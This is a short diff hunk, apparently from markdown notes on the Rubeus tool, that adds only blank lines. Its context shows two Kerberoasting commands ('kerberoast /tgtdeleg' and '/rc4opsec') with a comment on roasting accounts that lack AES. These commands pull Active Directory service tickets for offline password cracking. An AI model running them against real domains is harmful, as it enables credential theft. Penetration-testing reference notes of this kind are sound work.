@@ -31,3 +31,5 @@ Rubeus.exe kerberoast /tgtdeleg
 # The tgtdeleg trick is used, and accounts without AES enabled are enumerated and roasted.
 Rubeus.exe kerberoast /rc4opsec
 ```
+
+
